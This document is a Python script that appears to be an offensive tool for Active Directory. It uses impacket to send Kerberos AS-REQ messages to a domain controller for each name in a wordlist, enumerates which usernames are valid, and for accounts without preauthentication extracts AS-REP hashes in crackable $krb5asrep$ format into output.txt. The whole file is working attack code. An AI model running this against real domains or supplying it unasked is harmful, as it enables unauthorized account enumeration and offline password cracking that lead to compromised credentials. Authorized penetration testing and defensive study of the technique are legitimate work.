#!/usr/bin/env python

from binascii import hexlify
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import Principal
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue
import argparse, signal, sys, random, datetime, logging

def handler(sig, frame):
    print("\n\n[i] SALIENDO\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler) 

def getARG():
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", "--kdc", dest="kdc", help="IP for the KDC")
    parser.add_argument("-d", "--domain", dest="domain", help="The domain to enumerate")
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="The users wordlist")

    opcion = parser.parse_args()
    if not opcion.kdc:
        parser.error("[-] Specify the kdc ip for help use -h")
    if not opcion.domain:
        parser.error("[-] Specify the domain for help use -h")
    if not opcion.wordlist:
        parser.error("[-] Specify the users wordlist for help use -h")
    return opcion

class ASReqAttack:
    def __init__(self, domain, kdc_ip, username):
        self.domain = domain
        self.kdc_ip = kdc_ip
        self.username = username

    def create_as_req(self):
        client_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        server_name = Principal('krbtgt/%s' % self.domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pac_request = KERB_PA_PAC_REQUEST()
        pac_request['include-pac'] = True
        encoded_pac_request = encoder.encode(pac_request)

        as_req = AS_REQ()
        as_req['pvno'] = 5
        as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        as_req['padata'] = noValue
        as_req['padata'][0] = noValue
        as_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        as_req['padata'][0]['padata-value'] = encoded_pac_request

        req_body = as_req['req-body']
        req_body['kdc-options'] = constants.encodeFlags([constants.KDCOptions.forwardable.value,
                                                         constants.KDCOptions.renewable.value,
                                                         constants.KDCOptions.proxiable.value])

        seq_set(req_body, 'sname', server_name.components_to_asn1)
        seq_set(req_body, 'cname', client_name.components_to_asn1)

        req_body['realm'] = self.domain.upper()

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        req_body['till'] = now.strftime("%Y%m%d%H%M%SZ")
        req_body['rtime'] = now.strftime("%Y%m%d%H%M%SZ")
        req_body['nonce'] = random.getrandbits(31)

        supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(req_body, 'etype', supported_ciphers)

        return encoder.encode(as_req)

    def outputTGT(self, entry, fd=None):
        if fd is not None:
            fd.write(entry + '\n')

    def send_as_req(self):
        message = self.create_as_req()
        try:
            response = sendReceive(message, self.domain, self.kdc_ip)
            asRep = decoder.decode(response)[0]
            if asRep[1] == 11:
                asRep = decoder.decode(response,asn1Spec=AS_REP())[0]
                print(f"[+] User {self.username} is valid y doesn't require preauth")
                formatted_string = '$krb5asrep$%s@%s:%s$%s' % (self.username, 
                                                    self.domain.upper(),
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
                print(formatted_string)
                
                with open('output.txt', 'a') as f:
                    self.outputTGT(formatted_string, f)
            elif asRep[1] == 30:
                if asRep[4] == 25:
                    print(f"[+] User {self.username} is valid")
        except KerberosError as e:
            if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in str(e):
                print(f"[+] User {self.username} is invalid")
            else:
                print(f"Kerberos error: {e}")
        except Exception as e:
            print(f"Error sending AS-REQ: {e}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    opts = getARG()
    domain = opts.domain
    kdc_ip = opts.kdc

    with open(opts.wordlist, 'r') as archivo:
        palabras = archivo.read().splitlines()
        for i in palabras:
            asreq_attack = ASReqAttack(domain, kdc_ip, i)
            asreq_attack.send_as_req()
